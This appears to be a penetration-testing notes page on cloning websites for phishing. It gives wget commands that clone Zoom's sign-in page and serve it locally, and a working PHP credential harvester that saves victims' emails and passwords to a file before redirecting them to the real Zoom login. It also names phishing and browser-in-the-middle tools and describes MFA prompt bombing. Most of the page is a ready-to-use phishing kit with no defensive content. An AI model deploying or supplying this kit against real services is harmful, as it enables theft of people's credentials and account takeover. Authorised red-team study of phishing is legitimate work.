---
title:  Tools for cloning a site
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - web pentesting
  - phishing
  - tools
---
# Tools for cloning a site

[BeEF](beef.md).

[Veil](veil.md)

[URLCrazy](https://github.com/urbanadventurer/urlcrazy): URLCrazy is an OSINT tool to generate and test domain typos or variations to detect or perform typo squatting, URL hijacking, phishing, and corporate espionage.


## Creating a phishing site

### Cuddlephish

https://github.com/fkasler/cuddlephish

Weaponized multi-user browser-in-the-middle (BitM) for penetration testers. This attack can be used to bypass multi-factor authentication on many high-value web applications. It even works for applications that do not use session tokens, and therefore would not be exploitable using traditional token stealing attacks. This is a social engineering tool and does not exploit any technical flaws in the target service.

Cloning Zoom site:

```bash
# Create directory
mkdir ZoomSignin
cd ZoomSignin

# Clon the site with wget
wget -E -k -K -p -e robots=off -H -Dzoom.us -nd "https://zoom.us/signin#/login"
# -E to change the file extension to match the MIME type of the downloaded file
# convert all the links in the document to point to local alternatives with -k 
# -K to save the original file with a .orig extension.
# -p to download all the files necessary for viewing the specific page
# -e robots=off will ignore robots.txt directives which might otherwise hinder our download
# -H download all files from external hosts,  
# limited to files on the zoom.us domain with -Dzoom.us
# -nd save all files in a flat directory structure in our current working directory.

# Serve the site locally 
python -m http.server 80

# Visit the site http://localhost/signin.html
# This presents an OWASP CSRF Guard error alert box. This is somewhat expected since we tried to load externally-hosted JavaScript. We'll note this for now and click through the alert.
```

Now we need to modify the submit POST that actionates our malicious code. Our malicious code could be this custom_loging php file (do not forget to add 777 rights to this file and the credentials.txt one):

```php
<?php
// Check if the form fields 'email' and 'password' are set
if (isset($_POST['email']) && isset($_POST['password'])) {
    // Get the email and password from the form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Define the file path to store the credentials
    $file = 'credentials.txt';

    // Prepare the data to write (append mode)
    $data = "Email: " . $email . "\nPassword: " . $password . "\n\n";

    // Use file_put_contents to write to the file and create it if it doesn’t exist
    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX) === false) {
        echo "Error writing to file.";
        exit();
    }

    // Redirect the user to the official Zoom sign in page
    header('Location: https://zoom.us/signin#/login');
    exit();
} else {
    // If the form is not submitted correctly, output an error message
    echo "Please ensure both email and password are provided.";
}
?>
```



## Bypassing MFA

Once we have credentials, we may hit another roadblock in the form of [Multi-Factor Authentication](https://www.onelogin.com/learn/what-is-mfa) (MFA). This is another security mechanism which many organizations implement to slow down an attack, even in the event of credential compromise.

There are several ways we might want to handle this. One common technique is [_prompt bombing_](https://www.tripwire.com/state-of-security/mfa-prompt-bombing-what-you-need-know), which targets MFA applications that use push-based authentication prompts. In this strategy, we bombard the target with login attempts, which trigger prompts on their phone asking them to approve the login. This can create a phenomenon known as [_MFA fatigue_](https://duo.com/blog/mfa-fatigue-what-is-it-how-to-respond), where users assume the authorization requests are legitimate (albeit glitched) and accept one to stop the alerts.